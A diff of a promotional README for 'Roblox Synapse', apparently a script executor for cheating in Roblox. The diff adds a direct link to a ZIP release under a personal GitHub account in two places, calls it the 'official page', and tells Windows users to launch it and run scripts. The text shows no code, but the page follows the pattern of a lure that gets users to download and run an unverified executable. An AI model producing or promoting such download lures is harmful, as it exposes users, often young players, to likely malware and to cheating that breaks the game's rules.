@@ -13,7 +13,7 @@
 ---
 
 ### **How to Get Started**  
-1. [Download Synapse]() directly from our official page.  
+1. [Download Synapse](https://github.com/Kolieres/Roblox-Synapse/releases/download/Download/Synapse.zip) directly from our official page.  
 2. Launch the software on your Windows computer.  
 3. Add your script, press **RUN**, and watch it work instantly.  
 
@@ -34,4 +34,4 @@
 ---
 
 ### **Download Roblox Synapse Now**  
-Ready to elevate your Roblox experience? [Download Synapse](#) today and unlock endless creative opportunities. Setup is quick, so you’ll be up and running in minutes!  
+Ready to elevate your Roblox experience? [Download Synapse](https://github.com/Kolieres/Roblox-Synapse/releases/download/Download/Synapse.zip) today and unlock endless creative opportunities. Setup is quick, so you’ll be up and running in minutes!  
